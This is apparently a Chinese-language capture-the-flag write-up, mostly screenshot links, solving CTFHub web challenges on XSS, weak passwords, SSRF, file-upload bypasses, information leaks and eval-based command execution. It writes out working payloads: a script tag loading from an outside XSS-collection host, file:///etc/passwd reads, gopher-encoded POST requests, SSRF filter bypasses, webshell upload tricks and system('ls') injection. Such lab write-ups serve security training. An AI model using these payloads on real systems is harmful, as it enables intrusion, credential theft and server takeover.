![image-20220610101401283](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610101401283.png)

![image-20220610101503366](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610101503366.png)

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610104642430.png" alt="image-20220610104642430" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610104722751.png" alt="image-20220610104722751" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610104956215.png" alt="image-20220610104956215" style="zoom:80%;" />

把这个代码放到name之后得

```
http://challenge-283b0a5aa0e44c88.sandbox.ctfhub.com:10800/?name=<sCRiPt sRC=//xss.pt/z45c></sCrIpT>
```

然后去看创建的项目

![image-20220610105238840](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610105238840.png)

## *密码口令

### **弱口令

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610112652238.png" alt="image-20220610112652238" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610112800484.png" alt="image-20220610112800484" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610113808411.png" alt="image-20220610113808411" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610113915910.png" alt="image-20220610113915910" style="zoom:80%;" />![image-20220610114345357](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610114345357.png)

### **默认口令

直接上网址搜常见网络安全设备默认口令

https://www.cnblogs.com/bflw/p/12938013.html

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610114451206.png" alt="image-20220610114451206" style="zoom:80%;" />

![image-20220610115718488](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610115718488.png)

## *SSRF

SSRF（server-side request forgery，服务端请求伪造），是一种由攻击者构造形 成由服务器发起请求的一个漏洞。让服务器去请求通常请求不到的东西。
一般用来在外网探测或攻击内网服务。

SSRF漏洞形成的原因多事服务端提供了从外部服务获取数据的功能，但没有对目标地址、协议等重要参数进行过滤和限制，从而导致攻击者可以自由构造参数，而发起预期外的请求

```
相关函数：
file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中
fsockopen()：打开一个网络连接或者一个Unix 套接字连接
curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用
```

**相关协议**

1.file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容

```
ssrf.php?url=file:///etc/passwd
ssrf.php?url=file:///var/www/html/flag.php
```

2.http/s协议：探测内网主机存活

http/s协议：探测内网主机存活

3.dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等

4.gopher协议（攻击内网服务的万金油）：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell

```
URL: gopher://<host>:<port>/<gopher-path>_后接TCP数据流
```

注意：

1.gopher的默认端口是70如果发起POST请求

2.回车换行需要使用%0D%0A来代替%0A如果多个参数

3.参数之间的&也需要进行URL编码

```
使用方式：

1.构造HTTP GET/POST请求消息

2.对请求消息进行URL编码

3.将编码后的字符串中%0A替换为%0D%0A

4.将最终的字符串再进行一次URL编码

5.拼接协议头、请求地址
```



### **内网访问

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610151610972.png" alt="image-20220610151610972" style="zoom:80%;" />

题目这已经提示要访问的内网地址了，网站并没有设置waf之类防御的机制，构造payload如下：

```XML
?url=127.0.0.1/flag.php
```

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610150850554.png" alt="image-20220610150850554" style="zoom:80%;" />

### **伪协议读取文件

伪协议：事实上是其支持的协议与封装协议。而其支持的部分协议有：

        file:// — 访问本地文件系统
    
        http:// — 访问 HTTP(s) 网址
    
        ftp:// — 访问 FTP(s) URLs
    
        php:// — 访问各个输入/输出流(I/O streams)

**网站的目录一般都在/var/www/html/**，我们由此构造payload：

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610151541693.png" alt="image-20220610151541693" style="zoom:80%;" />

```
http://challenge-b67cd60f89c822bc.sandbox.ctfhub.com:10800/?url=file:/var/www/html/flag.php
```

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610151346920.png" alt="image-20220610151346920" style="zoom:80%;" />

打开源代码

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610151416234.png" alt="image-20220610151416234" style="zoom:80%;" />

### **端口扫描

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610151517794.png" alt="image-20220610151517794" style="zoom:80%;" />

抓包，构建爆破参数

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610152017242.png" alt="image-20220610152017242" style="zoom:80%;" />

payloads页设置

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610152124507.png" alt="image-20220610152124507" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610152223206.png" alt="image-20220610152223206" style="zoom:80%;" />

### **POST请求

启动环境，访问页面为空白，通过 GET 传参直接拼接上`127.0.0.1/flag.php`，访问后得到一个输入框

http://challenge-d26dcba417f0feb2.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610153332154.png" alt="image-20220610153332154" style="zoom:80%;" />

查看源码

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610161044046.png" alt="image-20220610161044046" style="zoom:80%;" />

得到key输入

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610153435308.png" alt="image-20220610153435308" style="zoom:80%;" />

提示只允许从127.0.0.1访问，尝试通过file协议读取index.php以及flag.php页面的源码，构造如下 Payload：

```
?url=file:///var/www/html/index.php
?url=file:///var/www/html/flag.php
```

得到index.php页面源码如下：
<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610153605955.png" alt="image-20220610153605955" style="zoom:80%;" />![image-20220610153645357](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610153645357.png)

得到index.php页面源码如下：

得到`flag.php`页面源码如下：

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610153804351.png" alt="image-20220610153804351" style="zoom:80%;" />

```
一个比较好的思路：目前已知flag.php含有奇怪字符key，index.php能够接受url传参，并利用curl功能访问url传参的内容。那么我们可以利用gopher协议往index.php中传入一个POST请求包。请求包里是flag.php的key。
```

看来应该是让我们输入这个key进入，从而得到flag，但是这里并没有提交的按钮啊，所以我们要自己构造post请求，将这个key发送过去。

构造gopher协议需要的post请求

```
POST /flag.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

key=c411440d2354dfc0a33969ec5d9b54ca
```

编码后为

![img](file:///E:\软件\qq\1641428780\Image\C2C\Image2\JU1(]%[`71W~$%3K)DNETFF.png)

在第一次编码后的数据中，将`%0A`全部替换为`%0D%0A`。因为 Gopher协议包含的请求数据包中，可能包含有`=`、`&`等特殊字符，避免与服务器解析传入的参数键值对混淆，所以对数据包进行 URL编码，这样服务端会把`%`后的字节当做普通字节。

第一次后变为

POST%20/flag.php%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0AContent-Length:%2036%0D%0A%0D%0Akey=c411440d2354dfc0a33969ec5d9b54ca

之后两次直接编码

![img](file:///E:\软件\qq\1641428780\Image\C2C\Image2\}AX47URCQ8ZU$FPOE~I6J1Z.png)

![image-20220610174546570](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610174546570.png)

**发送请求**

> gopher协议格式：URL:gopher://<host>:<port>/<gopher-path>_后接TCP数据流
>
> ?url=127.0.0.1/index.php/?url=gopher://127.0.0.1:80/_POST包

所以输入

http://challenge-d26dcba417f0feb2.sandbox.ctfhub.com:10800/

?url=127.0.0.1/index.php/?url=gopher://127.0.0.1:80/_POST%252520/flag.php%252520HTTP/1.1%25250D%25250AHost:%252520127.0.0.1%25250D%25250AContent-Type:%252520application/x-www-form-urlencoded%25250D%25250AContent-Length:%25252036%25250D%25250A%25250D%25250Akey=c411440d2354dfc0a33969ec5d9b54ca

得到

![image-20220610174843846](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610174843846.png)



### **上传文件

http://challenge-a3121c44ac14c19f.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php

![image-20220610182157048](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610182157048.png)

提示需要上传 Webshell，只有选择文件功能，并没有提交按钮。
使用`file`协议读取`flag.php`的源码

```bash
?url=file:///var/www/html/flag.php
```

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610182423622.png" alt="image-20220610182423622" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610182433905.png" alt="image-20220610182433905" style="zoom:80%;" />

发现flag.php处是一个文件上传界面，但是缺少提交按钮，修改前端页面，添加提交按钮

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610182638526.png" alt="image-20220610182638526" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610182734001.png" alt="image-20220610182734001" style="zoom:80%;" />

上传后抓包

![image-20220610193944394](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610193944394.png)

进行两次url编码，得到：

```
POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520challenge-a3121c44ac14c19f.sandbox.ctfhub.com:10800%250D%250AUser-Agent:%2520Mozilla/5.0%2520(Windows%2520NT%252010.0;%2520Win64;%2520x64;%2520rv:101.0)%2520Gecko/20100101%2520Firefox/101.0%250D%250AAccept:%2520text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8%250D%250AAccept-Language:%2520zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2%250D%250AAccept-Encoding:%2520gzip,%2520deflate%250D%250AContent-Type:%2520multipart/form-data;%2520boundary=---------------------------9089388617334566272340632599%250D%250AContent-Length:%2520354%250D%250AOrigin:%2520http://challenge-a3121c44ac14c19f.sandbox.ctfhub.com:10800%250D%250AConnection:%2520close%250D%250AReferer:%2520http://challenge-a3121c44ac14c19f.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php%250D%250AUpgrade-Insecure-Requests:%25201%250D%250A%250D%250A-----------------------------9089388617334566272340632599%250D%250AContent-Disposition:%2520form-data;%2520name=%2522file%2522;%2520filename=%25221.php%2522%250D%250AContent-Type:%2520application/octet-stream%250D%250A%250D%250Awasda%250D%250A-----------------------------9089388617334566272340632599%250D%250AContent-Disposition:%2520form-data;%2520name=%2522submit%2522%250D%250A%250D%250A%25C3%25A6%25C2%258F%25C2%2590%25C3%25A4%25C2%25BA%25C2%25A4%25C3%25A6%25C2%259F%25C2%25A5%25C3%25A8%25C2%25AF%25C2%25A2%250D%250A-----------------------------9089388617334566272340632599--%250D%250A
```

抓一个最初的

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610185611152.png" alt="image-20220610185611152" style="zoom:80%;" />

利用gopher去发送请求

![image-20220610195259093](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220610195259093.png)

### **FastCGI协议

```undefined
/?url=127.0.0.1/flag.php
```

### **URL Bypass

给出提示

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220611235845835.png" alt="image-20220611235845835" style="zoom:80%;" />

url参数的值中必须包含有`http://notfound.ctfhub.com`
可以采用@，也就是 HTTP 基本身份认证绕过
HTTP 基本身份认证允许 Web 浏览器或其他客户端程序在请求时提供用户名和口令形式的身份凭证的一种登录验证方式。
也就是：`http://www.xxx.com@www.yyy.com形式`

构造题目所需 Payload：

```
?url=http://notfound.ctfhub.com@127.0.0.1/flag.php
```

![image-20220611235754031](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220611235754031.png)

### **数字IP Bypass

这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢

把`127`转为十六进制0x7f（?url=2130706433/flag.php），或者直接localhost（?url=localhost/flag.php）

```
[IP地址进制转换 (520101.com)](https://tool.520101.com/wangluo/jinzhizhuanhuan/)
```

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220612001013976.png" alt="image-20220612001013976" style="zoom:80%;" />

![image-20220612000518404](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220612000518404.png)

### **302跳转 Bypass

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220612001251761.png" alt="image-20220612001251761" style="zoom:80%;" />

启动环境，依然为空白界面，查看URL：

```
http://challenge-d24469fc89d86387.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php
```

其中有通过GET传参的url，尝试访问127.0.0.1/flag.php页面：

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220612001325753.png" alt="image-20220612001325753" style="zoom:80%;" />

提示：不允许企业内部IP访问，使用file协议获取其源码：

```
?url=file:///var/www/html/flag.php
```

得到flag.php页面源码：

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220612001446454.png" alt="image-20220612001446454" style="zoom:80%;" />
与之前一样，通过`REMOTE_ADDR`请求头限制本地IP请求，源码中并没有之前的

```
hacker! Ban Intranet IP
```

所以查看`index.php`页面的源码：

```
?url=file:///var/www/html/index.php
```

得到`index.php`页面源码：

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220612001612797.png" alt="image-20220612001612797" style="zoom:80%;" />
其中存在黑名单，限制了127、172、10、192网段，其实可以通过localhost的方式绕过，即?url=localhost/flag.php
也可以得到flag：

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220612001646847.png" alt="image-20220612001646847" style="zoom:80%;" />

但题目提示使用302跳转方式，尝试`http://127.0.0.1/flag.php`转换为短网址：
![image-20220612001844806](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220612001844806.png)

### **DNS重绑定 Bypass

```
[rbndr.us 域名解析重新绑定服务 (cmpxchg8b.com)](https://lock.cmpxchg8b.com/rebinder.html)
```

![image-20220612013050670](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220612013050670.png)

![image-20220612013024481](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220612013024481.png)



## *文件上传

### **无验证

件上传漏洞最简单的就是上传小马，即一句话木马

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220613163537738.png" alt="image-20220613163537738" style="zoom:80%;" />

上传成功

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220613163841097.png" alt="image-20220613163841097" style="zoom:80%;" />

这里连接的密码就是我们前面所写的一句话木马$_POST这个括号里面的内容

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220613164124127.png" alt="image-20220613164124127" style="zoom:80%;" />![image-20220613170411358](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220613170411358.png)

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220613170418296.png" alt="image-20220613170418296" style="zoom:80%;" />

### **前端验证

源代码

![image-20220613222245856](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220613222245856.png)

除了后缀名为jpg、png 、gif格式的文件之外，其他文件不允许上传。

将shell.php改为shell.png抓包

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220613222156299.png" alt="image-20220613222156299" style="zoom:80%;" />

将格式再改回来.php

![image-20220613222713128](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220613222713128.png)

使用蚁剑

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220613222658949.png" alt="image-20220613222658949" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220613222726025.png" alt="image-20220613222726025" style="zoom:80%;" />

### **.htaccess

.htaccess是一个纯文本文件，存放着Apache服务器配置相关的指令。
       .htaccess主要的作用有：URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止/允许特定IP/IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。
       .htaccess的用途范围主要针对当前目录。
       尝试上传一个我们的木马PHP文件

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220613224545586.png" alt="image-20220613224545586" style="zoom:80%;" />

 发现页面显示文件类型不匹配

![image-20220613224620481](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220613224620481.png)

通过网页代码，我们发现网页的上传位置设置了黑名单，我们的PHP木马文件被黑名单拦截了。

发现PHP文件被网页进行拦截，那我们就要考虑如何绕过。根据题目提示，要用.htaccess方法，如何htaccess又不在黑名单文件内，那我们可以直接编写一个.htaccess文件进行上传，篡改服务器本地的.htaccess文件。

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220613225737996.png" alt="image-20220613225737996" style="zoom:80%;" />

然后将这个文件上传到服务器，替换掉服务器中原有的.htaccess文件。

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220613224851668.png" alt="image-20220613224851668" style="zoom:80%;" />

上传成功后，服务器上的.htaccess已被我们替换，这时候我们只需要将我们的PHP文件，修改为其他不在黑名单之内的后缀名，进行上传，就会自动被服务器当作PHP文件解析，  这里我们将我们的一句话木马文件名修改成 shell.jpg    进行上传

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220613225720955.png" alt="image-20220613225720955" style="zoom:80%;" />

使用蚁剑

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220613225915069.png" alt="image-20220613225915069" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220613225931571.png" alt="image-20220613225931571" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220613225942627.png" alt="image-20220613225942627" style="zoom:80%;" />

### **MIME验证

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220613230336967.png" alt="image-20220613230336967" style="zoom:80%;" />

![image-20220613230627364](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220613230627364.png)

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220613230616402.png" alt="image-20220613230616402" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220613230646741.png" alt="image-20220613230646741" style="zoom:80%;" />

### **文件头检查

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220613230855217.png" alt="image-20220613230855217" style="zoom:80%;" />

上传666.php并改类型

![image-20220614011006506](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220614011006506.png)

加GIF89a

![image-20220614011100919](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220614011100919.png)

使用蚁剑

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220614010757517.png" alt="image-20220614010757517" style="zoom:80%;" />![image-20220614010824151](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220614010824151.png)

![image-20220614010824151](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220614010824151.png)

### **00截断

直接上传不太行

![image-20220615081614475](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615081614475.png)

png文件可以上传

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615081841224.png" alt="image-20220615081841224" style="zoom:80%;" />

查看源代码

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615081640167.png" alt="image-20220615081640167" style="zoom:80%;" />

这里因为有文件路径，那么使用%00截断的时候，让他生成了一个2.php的文件，然后将3.jpg的内容写了进去

![image-20220615082749875](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615082749875.png)

链接的也是1.php

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615083215552.png" alt="image-20220615083215552" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615083232662.png" alt="image-20220615083232662" style="zoom:80%;" />

### **双写后缀

上传1.php后缀被过滤为1.

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615083656841.png" alt="image-20220615083656841" style="zoom:80%;" />![image-20220615083822166](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615083822166.png)

如果是文件名被过滤，我们就可以直接利用双写来绕过。我们回到我们的木马文件,将他的后缀进行两次写入

将其后缀名修改成pphphp

![image-20220615083822166](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615083822166.png)

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615083903600.png" alt="image-20220615083903600" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615083933086.png" alt="image-20220615083933086" style="zoom:80%;" />



## *信息泄露

### **目录遍历

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615085940187.png" alt="image-20220615085940187" style="zoom:80%;" />



<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615090033519.png" alt="image-20220615090033519" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615090229935.png" alt="image-20220615090229935" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615090241416.png" alt="image-20220615090241416" style="zoom:80%;" />

### **phpinfo

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615091058980.png" alt="image-20220615091058980" style="zoom:80%;" />

场景上有一个绿色按钮 点击查看phpinfo 输出了关于 PHP 配置的信息

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615091133522.png" alt="image-20220615091133522" style="zoom:80%;" />

大家都知道CTFHub 的答案形式是 ctf{xxxx}
CTRL + F 打开页面查找，查找ctf关键字 答案就出来了。

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615091231439.png" alt="image-20220615091231439" style="zoom:80%;" />

### **备份文件下载

#### ***网站源码

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615095327300.png" alt="image-20220615095327300" style="zoom:80%;" />

**dirsearch扫描git泄露**

![image-20220615180728878](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615180728878.png)

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615180603887.png" alt="image-20220615180603887" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615180709692.png" alt="image-20220615180709692" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615180857279.png" alt="image-20220615180857279" style="zoom:80%;" />

#### ***bak文件

打开如下

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615181047834.png" alt="image-20220615181047834" style="zoom:80%;" />

使用dirsearch进行扫描
命令：python3 dirsearch.py -u http://challenge-7d7b55b04c875278.sandbox.ctfhub.com:10800/ -e *

![image-20220615181433427](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615181433427.png)

在url的末尾输入/index.php.bak

下载完成后打开该文件

![image-20220615181507164](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615181507164.png)

#### ***vim缓存

```
vim 交换文件名
在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容
以 index.php 为例：第一次产生的交换文件名为 .index.php.swp
再次意外退出后，将会产生名为 .index.php.swo 的交换文件
第三次产生的交换文件则为 .index.php.swn
```

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615181617769.png" alt="image-20220615181617769" style="zoom:80%;" />

使用dirsearch进行扫描
命令：python3 dirsearch.py -u http://challenge-1b16734369a77d7c.sandbox.ctfhub.com:10800/ -e *

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615182049888.png" alt="image-20220615182049888" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615182142555.png" alt="image-20220615182142555" style="zoom:80%;" />

#### ***.DS_Store

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615182257763.png" alt="image-20220615182257763" style="zoom:80%;" />

python3 dirsearch.py -u http://challenge-272895e9841d1de7.sandbox.ctfhub.com:10800/ -e *

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615183139132.png" alt="image-20220615183139132" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615183340439.png" alt="image-20220615183340439" style="zoom:80%;" />

将ec1e3771593f5933aa7ecb2c6009c84e.txt输入网址

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220615183623149.png" alt="image-20220615183623149" style="zoom:80%;" />

## *RCE

### **eval执行

eval()函数中的eval是evaluate的简称，这个函数的作用就是把一段[字符串](https://so.csdn.net/so/search?q=字符串&spm=1001.2101.3001.7020)当作PHP语句来执行。

比如说`eval($_REQUEST["cmd"])`

```
$_REQUEST[]是接收数据用的,而其中的cmd 就是其中的数据
```

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220616113322009.png" alt="image-20220616113322009" style="zoom:80%;" />

[cmd](https://so.csdn.net/so/search?q=cmd&spm=1001.2101.3001.7020)是其中的参数，我们就把命令赋给cmd,我们先显示一下网页的根目录

```ruby
?cmd=system("ls");
```

![image-20220616113636012](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220616113636012.png)

接着我们看上一级目录

```
?cmd=system("ls /");
```

![image-20220616113727956](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220616113727956.png)

发现flag_28171，我们cat它

![image-20220616113909439](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220616113909439.png)













